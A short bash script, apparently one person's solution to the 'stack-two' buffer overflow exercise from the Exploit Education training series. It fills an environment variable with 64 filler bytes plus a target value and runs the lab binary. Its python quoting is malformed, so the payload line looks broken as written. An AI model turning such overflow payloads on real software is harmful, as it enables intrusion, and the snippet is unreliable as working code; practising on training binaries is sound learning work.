# Author: Matthew McKeever
# Date: 08/08/2021

#!/bin/bash

ExploitEducation=$(python -c "print('A'*0x40 + '\x0a'\x09\x0a\x0d')")
export ExploitEducation && ./stacktwo
unset ExploitEducation
